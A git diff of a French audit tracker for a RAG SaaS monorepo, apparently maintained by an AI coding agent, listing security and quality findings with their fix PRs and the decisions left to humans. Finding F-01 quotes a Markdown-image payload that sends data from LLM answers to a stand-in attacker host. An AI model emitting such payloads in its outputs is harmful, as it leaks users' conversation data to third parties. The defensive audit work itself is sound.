@@ -15,8 +15,8 @@
 - [x] Phase 0 — Cartographie (CLAUDE.md lus, périmètres et fichiers listés, commandes identifiées)
 - [x] Phase 1 — Baseline
 - [x] Phase 2 — Audit fichier par fichier
-- [ ] Phase 3 — Corrections et PR
-- [ ] Phase 4 — PR de clôture
+- [x] Phase 3 — Corrections et PR
+- [x] Phase 4 — PR de clôture
 
 ## Périmètres (dossiers contenant un CLAUDE.md)
 
@@ -58,98 +58,201 @@ Voir le tableau détaillé dans `AUDIT_REPORT.md`. Suivi des statuts :
 
 | ID | Sévérité | Titre | Statut |
 |---|---|---|---|
-| B-01 | Critique | `GET /workspaces/:workspaceId/onboarding/stream` prend `agentId` et `stepId` en query-string sans vérifier que | PR ouverte ([#58](https://github.com/GenRAG/monorepo/pull/58)) |
-| B-02 | Critique | Login Google : `OAuth2Client.getTokenInfo(accessToken)` sans vérifier l'audience (`aud`/`azp` = client id GenR | PR ouverte ([#59](https://github.com/GenRAG/monorepo/pull/59)) |
-| B-03 | Haute | `activate(id, agentId)` désactive les workflows de `agentId` puis `update({ where: { id } })` **sans filtrer s | PR ouverte ([#60](https://github.com/GenRAG/monorepo/pull/60)) |
-| B-04 | Haute | Cookie d'auth `SameSite=None` en production, aucune protection CSRF, et Express accepte `application/x-www-for | décision humaine requise |
-| B-05 | Haute | Fichier de build incrémental TypeScript commité, contenant des chemins absolus d'un poste de dev (`/home/bollo | PR ouverte ([#61](https://github.com/GenRAG/monorepo/pull/61)) |
-| B-06 | Haute | `@getbrevo/brevo` et `sib-api-v3-sdk` ne sont plus utilisés (Resend les remplace) mais tirent `form-data` (cri | PR ouverte ([#62](https://github.com/GenRAG/monorepo/pull/62)) + décision humaine requise (reste) |
-| B-07 | Moyenne | `getModelInfo(modelId)` interpole le paramètre de route (décodé par Express : `/`, `?`, `#`, `..` possibles) d | PR ouverte ([#63](https://github.com/GenRAG/monorepo/pull/63)) |
+| B-01 | Critique | `GET /workspaces/:workspaceId/onboarding/stream` prend `agentId` et `stepId` en query-string sans vérifier… | PR ouverte ([#58](https://github.com/GenRAG/monorepo/pull/58)) |
+| B-02 | Critique | Login Google : `OAuth2Client.getTokenInfo(accessToken)` sans vérifier l'audience (`aud`/`azp` = client id G… | PR ouverte ([#59](https://github.com/GenRAG/monorepo/pull/59)) |
+| B-03 | Haute | `activate(id, agentId)` désactive les workflows de `agentId` puis `update({ where: { id } })` **sans filtre… | PR ouverte ([#60](https://github.com/GenRAG/monorepo/pull/60)) |
+| B-04 | Haute | Cookie d'auth `SameSite=None` en production, aucune protection CSRF, et Express accepte `application/x-www-… | décision humaine requise |
+| B-05 | Haute | Fichier de build incrémental TypeScript commité, contenant des chemins absolus d'un poste de dev (`/home/bo… | PR ouverte ([#61](https://github.com/GenRAG/monorepo/pull/61)) |
+| B-06 | Haute | `@getbrevo/brevo` et `sib-api-v3-sdk` ne sont plus utilisés (Resend les remplace) mais tirent `form-data` (… | PR ouverte ([#62](https://github.com/GenRAG/monorepo/pull/62)) + décision humaine requise (reste) |
+| B-07 | Moyenne | `getModelInfo(modelId)` interpole le paramètre de route (décodé par Express : `/`, `?`, `#`, `..` possibles… | PR ouverte ([#63](https://github.com/GenRAG/monorepo/pull/63)) |
 | B-08 | Moyenne | Chaque chunk du flux NDJSON est décodé isolément (`chunk.toString('utf-8')`) | PR ouverte ([#64](https://github.com/GenRAG/monorepo/pull/64)) |
-| B-09 | Moyenne | Pour une exception non-HTTP, `error` = l'objet exception brut sérialisé : les erreurs Prisma exposent `code`,  | PR ouverte ([#65](https://github.com/GenRAG/monorepo/pull/65)) |
-| B-10 | Moyenne | Export CSV des conversations : les champs (questions posées par les utilisateurs finaux) ne sont pas neutralis | à traiter |
-| B-11 | Moyenne | `PATCH /users/me` enregistre l'email tel quel (pas de `toLowerCase().trim()`), alors que login/register/reset  | à traiter (partiel) + décision humaine requise |
-| B-12 | Moyenne | `POST …/onboarding/steps-data` fusionne un objet `data` arbitraire dans `stepsData`, y compris la clé `queryCo | PR ouverte ([#58](https://github.com/GenRAG/monorepo/pull/58)) |
-| B-13 | Moyenne | `ThrottlerModule` est configuré mais `ThrottlerGuard` n'est pas global : seules les routes annotées sont limit | PR ouverte ([#58](https://github.com/GenRAG/monorepo/pull/58)) + décision humaine requise (reste) |
+| B-09 | Moyenne | Pour une exception non-HTTP, `error` = l'objet exception brut sérialisé : les erreurs Prisma exposent `code… | PR ouverte ([#65](https://github.com/GenRAG/monorepo/pull/65)) |
+| B-10 | Moyenne | Export CSV des conversations : les champs (questions posées par les utilisateurs finaux) ne sont pas neutra… | PR ouverte ([#66](https://github.com/GenRAG/monorepo/pull/66)) |
+| B-11 | Moyenne | `PATCH /users/me` enregistre l'email tel quel (pas de `toLowerCase().trim()`), alors que login/register/res… | PR ouverte ([#67](https://github.com/GenRAG/monorepo/pull/67)) + décision humaine requise (reste) |
+| B-12 | Moyenne | `POST …/onboarding/steps-data` fusionne un objet `data` arbitraire dans `stepsData`, y compris la clé `quer… | PR ouverte ([#58](https://github.com/GenRAG/monorepo/pull/58)) |
+| B-13 | Moyenne | `ThrottlerModule` est configuré mais `ThrottlerGuard` n'est pas global : seules les routes annotées sont li… | PR ouverte ([#58](https://github.com/GenRAG/monorepo/pull/58)) + décision humaine requise (reste) |
+| B-14 | Basse | Assistant final : l'appel à l'API RAG est lancé **avant** la vérification que `conversationId` appartient à… | PR ouverte ([#72](https://github.com/GenRAG/monorepo/pull/72)) |
 | B-15 | Moyenne | Le type MIME est celui déclaré par le client (`file.mimetype`), sans vérification du contenu (magic bytes) | décision humaine requise |
-| B-16 | Moyenne | Les documents sont identifiés auprès du moteur RAG par leur **nom** (`deleteDocument(doc.name, agentId)`, sour | décision humaine requise |
-| B-17 | Moyenne | Fichiers < 5 Mo copiés en base64 dans le payload du job BullMQ (Redis) ; `removeOnFail: false` conserve indéfi | décision humaine requise |
+| B-16 | Moyenne | Les documents sont identifiés auprès du moteur RAG par leur **nom** (`deleteDocument(doc.name, agentId)`, s… | décision humaine requise |
+| B-17 | Moyenne | Fichiers < 5 Mo copiés en base64 dans le payload du job BullMQ (Redis) ; `removeOnFail: false` conserve ind… | décision humaine requise |
+| B-18 | Basse | Hors production, BullMQ ignore `REDIS_URL` et fait `Number(REDIS_PORT)` sans défaut → `NaN` si seul `REDIS_… | PR ouverte ([#73](https://github.com/GenRAG/monorepo/pull/73)) |
 | B-19 | Moyenne | Changer ou réinitialiser son mot de passe ne révoque pas les JWT existants. | décision humaine requise |
-| B-20 | Moyenne | DSN Sentry en dur, `tracesSampleRate: 1.0`, actif dans tous les environnements (dev, tests, CI) ; la variable  | décision humaine requise |
-| B-21 | Moyenne | Le playground vérifie et **débite** les crédits (`skipUsageTracking` non positionné), alors que la doc indique | décision humaine requise |
-| B-24 | Moyenne | Index manquants sur des colonnes filtrées/triées : `Conversation(agentId, userId, updatedAt)`, `Conversation(w | décision humaine requise |
-| B-29 | Moyenne | 5 tests e2e échouent (baseline) : réponse `204` attendue `200` sur `DELETE agent` (le controller a `@HttpCode( | à traiter (partiel) + décision humaine requise |
-| B-33 | Moyenne | `node:23-alpine` (version non LTS, fin de vie), `yarn install` non figé, devDependencies dans l'image, exécuti | décision humaine requise |
-| B-34 | Moyenne | Chaque workspace créé reçoit 180 crédits (plan FREE) + 20 à l'onboarding, sans limite de création. | décision humaine requise |
-| B-35 | Moyenne | Suppression d'utilisateur / workspace / agent : cascade DB, mais fichiers S3 et vecteurs du moteur RAG jamais  | décision humaine requise |
-| B-36 | Moyenne | Si le client se déconnecte en cours de flux, le flux RAG est détruit (`destroy()` sans erreur) : ni `end` ni ` | décision humaine requise |
-| B-41 | Moyenne | CI back : pas de Redis, pas de variables `AWS_*`/`RESEND_*`/`S3_BUCKET` (lues par `getOrThrow` au démarrage),  | décision humaine requise |
-| F-01 | Moyenne | Les réponses du LLM sont rendues en Markdown avec les images autorisées : `![](https://attaquant/?q=…)` est ch | à traiter |
-| F-02 | Moyenne | Redirection vers `/validate?email=${data.email}` sans `encodeURIComponent` (contrairement à `PasswordForm.tsx: | à traiter |
-| F-08 | Moyenne | Les documents Word sont prévisualisés via `view.officeapps.live.com` en lui passant l'URL présignée S3. | décision humaine requise |
-| F-10 | Moyenne | Mixpanel activé d'office (`opt_in_tracking()`) sans consentement, avec `people.set({ $name, $email })`. | décision humaine requise |
-| F-11 | Moyenne | Écrans simulés en production : achat de crédits factice (`setTimeout`, « Visa •• 4242 »), fausse clé API `sk_l | décision humaine requise |
-| F-18 | Moyenne | Outillage de dev dans `dependencies` (eslint, prettier, typescript, @types/*, testing-library) ; `motion` et ` | décision humaine requise |
-| R-02 | Moyenne | Lint front non bloquant (`continue-on-error`), pas de typecheck/build de `packages/workflow` ni de `vitrine_fr | décision humaine requise |
-| V-02 | Moyenne | TODO ouverts : liens légaux (mentions légales, confidentialité) et email de contact absents, section sécurité/ | décision humaine requise |
-| V-03 | Moyenne | Le formulaire collecte email/entreprise/fonction sans mention d'information (finalité, durée, droits). | décision humaine requise |
-| W-01 | Moyenne | Un node MODEL resté placeholder (`isPlaceholder: true`, `modelName` indéfini) n'est pas ignoré : `serializeWor | décision humaine requise |
-| W-06 | Moyenne | Aucun test, alors que `serializeWorkflow` et `sanitizeWorkflowEdges` définissent le contrat avec le moteur RAG | décision humaine requise |
-| B-14 | Basse | Assistant final : l'appel à l'API RAG est lancé **avant** la vérification que `conversationId` appartient à l' | à traiter |
-| B-18 | Basse | Hors production, BullMQ ignore `REDIS_URL` et fait `Number(REDIS_PORT)` sans défaut → `NaN` si seul `REDIS_URL | à traiter |
+| B-20 | Moyenne | DSN Sentry en dur, `tracesSampleRate: 1.0`, actif dans tous les environnements (dev, tests, CI) ; la variab… | décision humaine requise |
+| B-21 | Moyenne | Le playground vérifie et **débite** les crédits (`skipUsageTracking` non positionné), alors que la doc indi… | décision humaine requise |
 | B-22 | Basse | La purge planifiée supprime des `Conversation`, la doc parle de `AgentQueryLog`. | décision humaine requise |
-| B-23 | Basse | La doc indique « un workspace démarre à 0 crédit (`POST /workspaces/:id/credit-balance`) » : le plan FREE octr | décision humaine requise |
-| B-25 | Basse | Listes non paginées : exports (toutes conversations + messages en mémoire), conversations d'un assistant, `GET | décision humaine requise |
+| B-23 | Basse | La doc indique « un workspace démarre à 0 crédit (`POST /workspaces/:id/credit-balance`) » : le plan FREE o… | décision humaine requise |
+| B-24 | Moyenne | Index manquants sur des colonnes filtrées/triées : `Conversation(agentId, userId, updatedAt)`, `Conversatio… | décision humaine requise |
+| B-25 | Basse | Listes non paginées : exports (toutes conversations + messages en mémoire), conversations d'un assistant, `… | décision humaine requise |
 | B-26 | Basse | `/docs` (référence API Scalar) exposé publiquement en production. | décision humaine requise |
 | B-27 | Basse | Aucun en-tête de sécurité HTTP (`helmet`). | décision humaine requise |
-| B-28 | Basse | Chaînes sans `@MaxLength`/`@IsNotEmpty` (nom d'agent, de workspace, changelog, query de `compare`…), `definiti | décision humaine requise |
-| B-30 | Basse | Logique métier et accès Prisma directement dans un controller (contraire à la règle Controller → Service → Rep | décision humaine requise |
-| B-31 | Basse | `catch (_e: any) { throw new NotFoundException(...) }` : toute erreur (DB indisponible, contrainte) devient un | à traiter |
-| B-32 | Basse | README = boilerplate NestJS ; aucune liste des variables d'environnement hors CLAUDE.md. | à traiter |
-| B-37 | Basse | `executeQuery` (onboarding `compare`) enregistre l'usage directement dans le chemin de la requête, contraireme | décision humaine requise |
-| B-38 | Basse | `DocumentModule` importé deux fois ; JSDoc de `_getCostBreakdown` placé au-dessus d'une autre méthode ; import | à traiter |
-| B-39 | Basse | Deux endpoints de logs de requêtes (`…/runtime/query-logs` et `…/analytics/query-logs`) et deux jeux d'interfa | décision humaine requise |
+| B-28 | Basse | Chaînes sans `@MaxLength`/`@IsNotEmpty` (nom d'agent, de workspace, changelog, query de `compare`…), `defin… | décision humaine requise |
+| B-29 | Moyenne | 5 tests e2e échouent (baseline) : réponse `204` attendue `200` sur `DELETE agent` (le controller a `@HttpCo… | PR ouverte ([#71](https://github.com/GenRAG/monorepo/pull/71)) + décision humaine requise (reste) |
+| B-30 | Basse | Logique métier et accès Prisma directement dans un controller (contraire à la règle Controller → Service →… | décision humaine requise |
+| B-31 | Basse | `catch (_e: any) { throw new NotFoundException(...) }` : toute erreur (DB indisponible, contrainte) devient… | PR ouverte ([#74](https://github.com/GenRAG/monorepo/pull/74), [#60](https://github.com/GenRAG/monorepo/pull/60)) |
+| B-32 | Basse | README = boilerplate NestJS ; aucune liste des variables d'environnement hors CLAUDE.md. | PR ouverte ([#76](https://github.com/GenRAG/monorepo/pull/76)) |
+| B-33 | Moyenne | `node:23-alpine` (version non LTS, fin de vie), `yarn install` non figé, devDependencies dans l'image, exéc… | décision humaine requise |
+| B-34 | Moyenne | Chaque workspace créé reçoit 180 crédits (plan FREE) + 20 à l'onboarding, sans limite de création. | décision humaine requise |
+| B-35 | Moyenne | Suppression d'utilisateur / workspace / agent : cascade DB, mais fichiers S3 et vecteurs du moteur RAG jama… | décision humaine requise |
+| B-36 | Moyenne | Si le client se déconnecte en cours de flux, le flux RAG est détruit (`destroy()` sans erreur) : ni `end` n… | décision humaine requise |
+| B-37 | Basse | `executeQuery` (onboarding `compare`) enregistre l'usage directement dans le chemin de la requête, contrair… | décision humaine requise |
+| B-38 | Basse | `DocumentModule` importé deux fois ; JSDoc de `_getCostBreakdown` placé au-dessus d'une autre méthode ; imp… | PR ouverte ([#75](https://github.com/GenRAG/monorepo/pull/75)) |
+| B-39 | Basse | Deux endpoints de logs de requêtes (`…/runtime/query-logs` et `…/analytics/query-logs`) et deux jeux d'inte… | décision humaine requise |
 | B-40 | Basse | Toutes les règles ESLint sont rétrogradées en `warn` : `yarn lint` ne peut jamais échouer. | décision humaine requise |
+| B-41 | Moyenne | CI back : pas de Redis, pas de variables `AWS_*`/`RESEND_*`/`S3_BUCKET` (lues par `getOrThrow` au démarrage… | décision humaine requise |
 | B-42 | Basse | Verrouillage par email uniquement (5 échecs / 15 min). | décision humaine requise |
-| B-43 | Basse | Énumération de comptes : `409` à l'inscription, message explicite « aucun compte GenRAG n'existe avec l'email  | décision humaine requise |
+| B-43 | Basse | Énumération de comptes : `409` à l'inscription, message explicite « aucun compte GenRAG n'existe avec l'ema… | décision humaine requise |
 | B-44 | Basse | Les OTP sont hachés en HMAC avec `JWT_SECRET` (réutilisation de clé). | décision humaine requise |
-| B-45 | Basse | Toutes les routes d'onboarding sont accessibles à un VIEWER : `start` crée un agent, `complete` réécrit le wor | décision humaine requise |
-| B-46 | Basse | `timeout` axios de 120 s ne couvre que l'attente des en-têtes : un flux qui cesse d'émettre reste ouvert indéf | décision humaine requise |
+| B-45 | Basse | Toutes les routes d'onboarding sont accessibles à un VIEWER : `start` crée un agent, `complete` réécrit le… | décision humaine requise |
+| B-46 | Basse | `timeout` axios de 120 s ne couvre que l'attente des en-têtes : un flux qui cesse d'émettre reste ouvert in… | décision humaine requise |
 | B-47 | Basse | Mélange fuseau serveur (`getHours`, `setHours(0)`) et UTC (`toISOString`, `DATE_TRUNC` côté DB). | décision humaine requise |
-| B-48 | Basse | Pas de test pour `WorkspaceRolesGuard`, `AgentBelongsToWorkspaceGuard`, `DocumentService`, `RagEngineService`, | décision humaine requise |
-| F-03 | Basse | Suppression d'agent sans `.unwrap()` : en cas d'échec (403 VIEWER, 5xx) la modale se ferme, l'événement Mixpan | à traiter |
-| F-04 | Basse | `handleDocumentDelete` fait `.unwrap()` sans `try/catch` : rejet de promesse non géré, aucun retour utilisateu | à traiter |
-| F-05 | Basse | Navigation vers `/dashboard` et `/workspaces`, routes qui n'existent plus (cf | à traiter |
-| F-06 | Basse | `URL.revokeObjectURL` appelé immédiatement après `a.click()`. | à traiter |
-| F-07 | Basse | `executeAgentRuntime` (`POST …/runtime`) et l'URL par défaut `…/runtime/stream` n'existent pas côté back ; cod | décision humaine requise |
+| B-48 | Basse | Pas de test pour `WorkspaceRolesGuard`, `AgentBelongsToWorkspaceGuard`, `DocumentService`, `RagEngineServic… | décision humaine requise |
+| B-49 | Basse | Les deux sinks du runtime dupliquent leur logique de fin de flux : `EMPTY_ANSWER_MESSAGE`, conversion coût… | PR ouverte ([#83](https://github.com/GenRAG/monorepo/pull/83)) |
+| F-01 | Moyenne | Les réponses du LLM sont rendues en Markdown avec les images autorisées : `![](https://attaquant/?q=…)` est… | PR ouverte ([#68](https://github.com/GenRAG/monorepo/pull/68)) |
+| F-02 | Moyenne | Redirection vers `/validate?email=${data.email}` sans `encodeURIComponent` (contrairement à `PasswordForm.t… | PR ouverte ([#69](https://github.com/GenRAG/monorepo/pull/69)) |
+| F-03 | Basse | Suppression d'agent sans `.unwrap()` : en cas d'échec (403 VIEWER, 5xx) la modale se ferme, l'événement Mix… | PR ouverte ([#70](https://github.com/GenRAG/monorepo/pull/70)) |
+| F-04 | Basse | `handleDocumentDelete` fait `.unwrap()` sans `try/catch` : rejet de promesse non géré, aucun retour utilisa… | PR ouverte ([#70](https://github.com/GenRAG/monorepo/pull/70)) |
+| F-05 | Basse | Navigation vers `/dashboard` et `/workspaces`, routes qui n'existent plus (cf | PR ouverte ([#70](https://github.com/GenRAG/monorepo/pull/70)) |
+| F-06 | Basse | `URL.revokeObjectURL` appelé immédiatement après `a.click()`. | PR ouverte ([#70](https://github.com/GenRAG/monorepo/pull/70)) |
+| F-07 | Basse | `executeAgentRuntime` (`POST …/runtime`) et l'URL par défaut `…/runtime/stream` n'existent pas côté back ;… | décision humaine requise |
+| F-08 | Moyenne | Les documents Word sont prévisualisés via `view.officeapps.live.com` en lui passant l'URL présignée S3. | décision humaine requise |
 | F-09 | Basse | Iframes de prévisualisation sans `sandbox` sur des fichiers déposés par les utilisateurs (dont `text/html`, cf | décision humaine requise |
+| F-10 | Moyenne | Mixpanel activé d'office (`opt_in_tracking()`) sans consentement, avec `people.set({ $name, $email })`. | décision humaine requise |
+| F-11 | Moyenne | Écrans simulés en production : achat de crédits factice (`setTimeout`, « Visa •• 4242 »), fausse clé API `s… | décision humaine requise |
 | F-12 | Basse | Route de dev publique `/test` (écran de bienvenue sans `onDone`). | décision humaine requise |
 | F-13 | Basse | Recherche et filtre par type appliqués à la seule page chargée (8 documents). | décision humaine requise |
 | F-14 | Basse | Une URL présignée demandée par carte PDF en vue grille. | décision humaine requise |
 | F-15 | Basse | Polling par `fetch()` direct (hors RTK Query, cf | décision humaine requise |
-| F-16 | Basse | Types divergents du back : `User.isEmailVerified` et `CurrentDeployment.activeWorkflow.{version,name}` ne sont | à traiter |
-| F-17 | Basse | Deux configurations ESLint divergentes ; ESLint 9 n'utilise que `.mjs`, la `.mts` est morte. | à traiter |
-| F-19 | Basse | Librairie de charts vendue (shadcn/bklit) dont une grande partie n'est pas utilisée (16 fichiers de l'app l'im | décision humaine requise |
-| F-20 | Basse | README = boilerplate CRA ; `ARCHITECTURE.md` décrit des routes supprimées (`/workspaces`, `/organisation`). | à traiter (partiel) + décision humaine requise |
+| F-16 | Basse | Types divergents du back : `User.isEmailVerified` et `CurrentDeployment.activeWorkflow.{version,name}` ne s… | décision humaine requise |
+| F-17 | Basse | Deux configurations ESLint divergentes ; ESLint 9 n'utilise que `.mjs`, la `.mts` est morte. | PR ouverte ([#77](https://github.com/GenRAG/monorepo/pull/77)) |
+| F-18 | Moyenne | Outillage de dev dans `dependencies` (eslint, prettier, typescript, @types/*, testing-library) ; `motion` e… | décision humaine requise |
+| F-19 | Basse | Librairie de charts vendue (shadcn/bklit) dont une grande partie n'est pas utilisée (16 fichiers de l'app l… | décision humaine requise |
+| F-20 | Basse | README = boilerplate CRA ; `ARCHITECTURE.md` décrit des routes supprimées (`/workspaces`, `/organisation`). | PR ouverte ([#78](https://github.com/GenRAG/monorepo/pull/78)) + décision humaine requise (reste) |
 | F-21 | Basse | Écran de chargement artificiel de 800 ms à chaque ouverture de l'app. | décision humaine requise |
-| F-22 | Basse | Hook RTK choisi conditionnellement (`cond ? useGetModelsRerankQuery : useGetModelsGenerationQuery`) puis appel | décision humaine requise |
-| F-23 | Basse | La doc indique que l'app consomme `packages/workflow/dist` ; craco aliasse en fait `@genrag/workflow` vers `pa | décision humaine requise |
-| R-01 | Basse | `.gitignore` ignore `package-lock.json` (workspace yarn), mais deux lockfiles npm périmés restent suivis dans  | à traiter (partiel) + décision humaine requise |
-| R-03 | Basse | Postgres (`admin/password`), pgAdmin (`admin/admin`) et Redis (sans mot de passe) publiés sur toutes les inter | décision humaine requise |
-| R-04 | Basse | `start.sh` lance le front en arrière-plan sans jamais le tuer (`FRONT_PID` inutilisé) ; `dev.sh e2e` attend Po | décision humaine requise |
-| R-05 | Basse | La doc racine annonce `POST /rag/index (multipart file + document_id)` ; le back appelle en réalité `POST /ing | décision humaine requise |
-| R-06 | Basse | README racine réduit à une procédure de déploiement « ghost repo ». | à traiter |
-| V-01 | Basse | Le README décrit un objet `features` (statuts `available`/`soon`) qui n'existe plus dans `content.ts` (déjà si | à traiter |
+| F-22 | Basse | Hook RTK choisi conditionnellement (`cond ? useGetModelsRerankQuery : useGetModelsGenerationQuery`) puis ap… | décision humaine requise |
+| F-23 | Basse | La doc indique que l'app consomme `packages/workflow/dist` ; craco aliasse en fait `@genrag/workflow` vers… | décision humaine requise |
+| W-01 | Moyenne | Un node MODEL resté placeholder (`isPlaceholder: true`, `modelName` indéfini) n'est pas ignoré : `serialize… | décision humaine requise |
+| W-02 | Basse | Déclaration de types manuelle obsolète (`WorkflowBuilder`, `preset`, `onDrop`… n'existent plus) | PR ouverte ([#79](https://github.com/GenRAG/monorepo/pull/79)) |
+| W-03 | Basse | Composant exporté mais utilisé nulle part, dont la suppression de node recrée une edge sans `sourceHandle`/… | PR ouverte ([#79](https://github.com/GenRAG/monorepo/pull/79)) |
+| W-04 | Basse | `handleAddChainNode` lit `registry` mais ne l'a pas dans ses dépendances `useCallback`. | PR ouverte ([#80](https://github.com/GenRAG/monorepo/pull/80)) |
+| W-05 | Basse | Peer `lucide-react ^0.500.0` (≡ `>=0.500 <0.501` en 0.x) incompatible avec la version de l'app (0.542) → av… | décision humaine requise |
+| W-06 | Moyenne | Aucun test, alors que `serializeWorkflow` et `sanitizeWorkflowEdges` définissent le contrat avec le moteur… | décision humaine requise |
+| W-07 | Basse | Listes de modèles statiques (`LLMS`, `ReRanker`) divergentes des modèles réels servis par l'API ; composant… | décision humaine requise |
+| V-01 | Basse | Le README décrit un objet `features` (statuts `available`/`soon`) qui n'existe plus dans `content.ts` (déjà… | PR ouverte ([#81](https://github.com/GenRAG/monorepo/pull/81)) |
+| V-02 | Moyenne | TODO ouverts : liens légaux (mentions légales, confidentialité) et email de contact absents, section sécuri… | décision humaine requise |
+| V-03 | Moyenne | Le formulaire collecte email/entreprise/fonction sans mention d'information (finalité, durée, droits). | décision humaine requise |
 | V-04 | Basse | Ancien site Next.js conservé dans le dépôt (exclu du build/lint). | décision humaine requise |
-| W-02 | Basse | Déclaration de types manuelle obsolète (`WorkflowBuilder`, `preset`, `onDrop`… n'existent plus) | à traiter |
-| W-03 | Basse | Composant exporté mais utilisé nulle part, dont la suppression de node recrée une edge sans `sourceHandle`/`ta | à traiter |
-| W-04 | Basse | `handleAddChainNode` lit `registry` mais ne l'a pas dans ses dépendances `useCallback`. | à traiter |
-| W-05 | Basse | Peer `lucide-react ^0.500.0` (≡ `>=0.500 <0.501` en 0.x) incompatible avec la version de l'app (0.542) → avert | décision humaine requise |
-| W-07 | Basse | Listes de modèles statiques (`LLMS`, `ReRanker`) divergentes des modèles réels servis par l'API ; composants > | décision humaine requise |
+| R-01 | Basse | `.gitignore` ignore `package-lock.json` (workspace yarn), mais deux lockfiles npm périmés restent suivis da… | PR ouverte ([#61](https://github.com/GenRAG/monorepo/pull/61)) + décision humaine requise (reste) |
+| R-02 | Moyenne | Lint front non bloquant (`continue-on-error`), pas de typecheck/build de `packages/workflow` ni de `vitrine… | décision humaine requise |
+| R-03 | Basse | Postgres (`admin/password`), pgAdmin (`admin/admin`) et Redis (sans mot de passe) publiés sur toutes les in… | décision humaine requise |
+| R-04 | Basse | `start.sh` lance le front en arrière-plan sans jamais le tuer (`FRONT_PID` inutilisé) ; `dev.sh e2e` attend… | décision humaine requise |
+| R-05 | Basse | La doc racine annonce `POST /rag/index (multipart file + document_id)` ; le back appelle en réalité `POST /… | décision humaine requise |
+| R-06 | Basse | README racine réduit à une procédure de déploiement « ghost repo ». | PR ouverte ([#82](https://github.com/GenRAG/monorepo/pull/82)) |
+
+## PR ouvertes (toutes vers `dev`)
+
+| PR | Périmètre | Thème | Constats couverts |
+|---|---|---|---|
+| [#58](https://github.com/GenRAG/monorepo/pull/58) | back | isolation multi-tenant du stream d'onboarding | B-01, B-12, B-13 (partiel) |
+| [#59](https://github.com/GenRAG/monorepo/pull/59) | back | vérification de l'audience du token Google au login ⚠ `GOOGLE_CLIENT_ID` requis | B-02 |
+| [#60](https://github.com/GenRAG/monorepo/pull/60) | back | scoping de l'activation de workflow sur l'agent | B-03, B-31 (partie workflow) |
+| [#61](https://github.com/GenRAG/monorepo/pull/61) | back | build cassé sur clone propre — `.tsbuildinfo` commité | B-05, R-01 (partiel) |
+| [#62](https://github.com/GenRAG/monorepo/pull/62) | back | retrait des SDK Brevo inutilisés (vulnérabilité critique `form-data`) | B-06 (partiel) |
+| [#63](https://github.com/GenRAG/monorepo/pull/63) | back | validation de l'id de modèle envoyé à l'API RAG | B-07 |
+| [#64](https://github.com/GenRAG/monorepo/pull/64) | back | caractères accentués corrompus dans les réponses streamées | B-08 |
+| [#65](https://github.com/GenRAG/monorepo/pull/65) | back | le filtre global ne divulgue plus le détail des erreurs internes | B-09 |
+| [#66](https://github.com/GenRAG/monorepo/pull/66) | back | injection de formules dans l'export CSV | B-10 |
+| [#67](https://github.com/GenRAG/monorepo/pull/67) | back | normalisation de l'email modifié dans le profil | B-11 (partiel) |
+| [#68](https://github.com/GenRAG/monorepo/pull/68) | front | pas d'images dans le Markdown des réponses IA | F-01 |
+| [#69](https://github.com/GenRAG/monorepo/pull/69) | front | email non encodé dans la redirection de validation | F-02 |
+| [#70](https://github.com/GenRAG/monorepo/pull/70) | front | échecs de suppression silencieux et routes supprimées | F-03, F-04, F-05, F-06 |
+| [#71](https://github.com/GenRAG/monorepo/pull/71) | back | réalignement des tests e2e obsolètes | B-29 (partiel) |
+| [#72](https://github.com/GenRAG/monorepo/pull/72) | back | pas d'appel LLM pour une conversation refusée | B-14 |
+| [#73](https://github.com/GenRAG/monorepo/pull/73) | back | port Redis `NaN` pour BullMQ hors production | B-18 |
+| [#74](https://github.com/GenRAG/monorepo/pull/74) | back | les pannes DB ne sont plus déguisées en 404 sur les agents | B-31 (partie agent) |
+| [#75](https://github.com/GenRAG/monorepo/pull/75) | back | nettoyages sans effet fonctionnel | B-38 |
+| [#76](https://github.com/GenRAG/monorepo/pull/76) | back | README du projet et `.env.example` | B-32 |
+| [#77](https://github.com/GenRAG/monorepo/pull/77) | front | suppression de la config ESLint morte | F-17 |
+| [#78](https://github.com/GenRAG/monorepo/pull/78) | front | README du projet et `.env.example` | F-20 (partiel) |
+| [#79](https://github.com/GenRAG/monorepo/pull/79) | workflow | suppression d'`index.d.ts` obsolète et de `NodeHeader` inutilisé | W-02, W-03 |
+| [#80](https://github.com/GenRAG/monorepo/pull/80) | workflow | dépendance `registry` manquante dans `handleAddChainNode` | W-04 |
+| [#81](https://github.com/GenRAG/monorepo/pull/81) | vitrine | README aligné sur `content.ts` | V-01 |
+| [#82](https://github.com/GenRAG/monorepo/pull/82) | racine | README du monorepo | R-06 |
+| [#83](https://github.com/GenRAG/monorepo/pull/83) | back | **refactor par pattern** — Template Method sur les sinks du runtime | B-49 |
+
+26 PR de correction, dont 1 refactor par pattern (#83). Chaque PR part de `dev` (1a94e09), est indépendante des autres et indique ses résultats avant/après.
+
+## Décisions humaines restantes (par priorité)
+
+Classées par sévérité puis par périmètre (back en premier). « (reste) » : une partie du constat est déjà corrigée en PR.
+
+| Priorité | ID | Sévérité | Constat | Décision à prendre (justification) |
+|---|---|---|---|---|
+| 1 | B-04 | Haute | Cookie d'auth `SameSite=None` en production, aucune protection CSRF, et Express accepte `application/x-www-… | impacte déploiement front/back |
+| 2 | B-06 | Haute (reste) | `@getbrevo/brevo` et `sib-api-v3-sdk` ne sont plus utilisés (Resend les remplace) mais tirent `form-data` (… | montées de version restantes (axios, `@nestjs/jwt`, `class-validator`…), dont des versions majeures |
+| 3 | B-11 | Moyenne (reste) | `PATCH /users/me` enregistre l'email tel quel (pas de `toLowerCase().trim()`), alors que login/register/res… | re-vérification de l'email modifié : nouveau flux (hors correctif) |
+| 4 | B-13 | Moyenne (reste) | `ThrottlerModule` est configuré mais `ThrottlerGuard` n'est pas global : seules les routes annotées sont li… | `ThrottlerGuard` global : limiterait des routes aujourd'hui libres, quotas à fixer |
+| 5 | B-15 | Moyenne | Le type MIME est celui déclaré par le client (`file.mimetype`), sans vérification du contenu (magic bytes) | nouvelle dépendance, changement d'UX de prévisualisation |
+| 6 | B-16 | Moyenne | Les documents sont identifiés auprès du moteur RAG par leur **nom** (`deleteDocument(doc.name, agentId)`, s… | contrat entre services |
+| 7 | B-17 | Moyenne | Fichiers < 5 Mo copiés en base64 dans le payload du job BullMQ (Redis) ; `removeOnFail: false` conserve ind… | comportement d'exploitation |
+| 8 | B-19 | Moyenne | Changer ou réinitialiser son mot de passe ne révoque pas les JWT existants. | migration de schéma |
+| 9 | B-20 | Moyenne | DSN Sentry en dur, `tracesSampleRate: 1.0`, actif dans tous les environnements (dev, tests, CI) ; la variab… | config de monitoring |
